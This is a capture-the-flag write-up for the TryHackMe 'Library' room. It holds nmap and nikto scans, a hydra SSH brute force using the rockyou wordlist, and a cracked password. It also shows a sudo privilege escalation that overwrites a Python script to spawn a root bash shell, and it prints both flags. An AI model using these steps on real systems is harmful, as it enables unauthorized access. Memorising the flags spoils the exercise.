
# Writeup
Machine info
```
IP: 
OS: Linux
Based: Database (Rebis)
```
[Visite the room from TryHackMe](https://tryhackme.com/room/bsidesgtlibrary)

## Pentest Methodology
---
### Information gathering

run nmap scan for service detection and open ports
>~$ nmap -sV 10.10.187.205

open port
```
22: ssh
80: http
```
Run nmap for http enumeration over the port 80

>~$ nmap -p80 --script http-enum* 10.10.187.205 

Discovered file and Directory
```
/robots.txt: Robots file
|_  /images/: 
```

users that are comment on the blog
```
root
www-data
anonymous
```
Blog owned by meliodas maybe it can be part of the list user
<!--Posted on June 29th 2009 by meliodas-->

### Vulnerability Assessment
 
Run nikto against the target
>nikto -h 10.10.187.205

~~Nothing found with nikto~~

### Exploitation

Create a file called `users.txt` and add these names
```
meliodas
root
www-data
anonymous
```

Try to brute force ssh for each users using rockyou wordlist
```
~$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.187.205 -t 32
```
Credential found for user melodas
```
username: meliodas
password: iloveyou1
```
Login on the target using ssh
>~$ ssh meliodas@10.10.187.205

Read user meliodas contents
>~$ cat user.txt

user flag: 6d488cbb3f111d135722c33cb635f4ec

### Privilege Escalation

Let's check if `meliodas` can run command can we run as sudo
>~$ sudo -l

Result:
```
(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
Try if we can modify the file

>sudo nano ~/bak.py 

*We got an error message*

Try to make a copy of the file 
>~$ cp bak.py bak_old.py

*Yes it works*

To escalate our priv let's overwrite the file

>~$ echo 'import pty;pty.spawn("/bin/bash")' \> bak.py

Run the root terminal
>~$ sudo /usr/bin/python3 /home/meliodas/bak.py

>root@ubuntu:~# 

root lag: e8c8c6c256c35515d1d344ee0488c617

